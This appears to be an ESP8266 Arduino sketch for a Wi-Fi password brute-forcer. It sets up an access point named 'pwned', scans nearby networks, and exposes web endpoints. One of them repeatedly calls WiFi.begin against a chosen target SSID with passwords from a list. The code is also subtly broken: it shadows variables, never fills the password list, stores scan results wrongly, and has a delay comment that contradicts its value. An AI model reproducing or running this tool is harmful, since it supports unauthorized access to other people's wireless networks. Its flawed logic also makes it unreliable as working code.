#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <vector>
#include <string>

#include "globalVar.h"

ESP8266WebServer server(80);

const char* apSsid = "pwned";
const char* apPassword = "password";

extern std::string htmlHome;
std::vector<int> scannedNet;
std::vector<String> storeNetworks;
std::vector<String> crckpayload;

String ssidPass;
String targetPass;
String inputSsid;

void setup() {
  Serial.begin(115200); // pls dont touch this sec
  delay(50);

  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP(apSsid, apPassword);
  Serial.println("\nConnected, IP: " + WiFi.softAPIP().toString()); /// pls dont touch 
  
  server.on("/", handleRoot);
  server.on("/input", inputHandler);
  server.on("/monitor", monitorMode);
  server.on("/checkPass", bruteForce);

  server.begin();
  Serial.println("Web server started");

  std::vector<int> scannedNet = {static_cast<int>(WiFi.scanNetworks())};

  if (scannedNet.size() == 0) {
    Serial.println("No networks found");
  } else {
    Serial.print(scannedNet.size());
    Serial.println(" networks found");
    
    for (int i = 0; i < scannedNet.size(); ++i) {
      Serial.print(i + 1);
      Serial.print(": ");
      Serial.print(WiFi.SSID(i));
      Serial.print(" (");
      Serial.print(WiFi.RSSI(i));
      Serial.print(" dBm)");
      delay(10);
      storeNetworks.push_back(WiFi.SSID());
      Serial.println(" ");
      delay(10);
      
    }
  }
}

void handleRoot() {
  server.send(200, "text/html", htmlHome.c_str());}

void inputHandler() {
  if (server.hasArg("targetSsid")) {

    String inputSsid = server.arg("targetSsid");
    Serial.println("Received input: " + inputSsid);
    server.send(200, "text/plain", "200 ok" + inputSsid);

  } else {
    server.send(400, "text/plain", "error 400");
  }
}

void bruteForce(){
  String ssid = server.arg("targetSsid");
  String password1 = server.arg("password");

  if(WiFi.status() != WL_CONNECTED){
    for(signed char i = 0;i<crckpayload.size();++i){
      String targetPass= crckpayload[i];
      Serial.println(targetPass);
      WiFi.begin(inputSsid.c_str(), targetPass.c_str());
      delay(1000);// 2 sec
    }
    String ssidPass = targetPass;
    }
}
void passwordFound(){
          String response = "<html><body><h1>Connecting to " + ssidPass + "</h1></body></html>";
          server.send(200, "text/html", response);
          Serial.println("password found: ");
          Serial.print(ssidPass);
      }

void monitorMode(){
  String html1 = "<html><head><title>ESP8266 Data</title></head><body>";
  html1 += "<h1>Wi-Fi Scan Results</h1>";
  html1 += "<p>Found " + String(scannedNet.size()) + " networks:</p>";
  html1 += "<ul>";
  
  for (const auto& network : storeNetworks) {
    html1 += "<li>" + network + "</li>";
  }
  
  html1 += "</ul>";
  html1 += "</body></html>";
  
  server.send(200, "text/html", html1);
}
void loop() {
  server.handleClient();

  if(server.hasArg("targetSsid")) {
    if(WiFi.status() != WL_CONNECTED){
        Serial.println("brute force has started");
        bruteForce();
  }
  else{
    Serial.println("done done");
    passwordFound();
    }
  }
}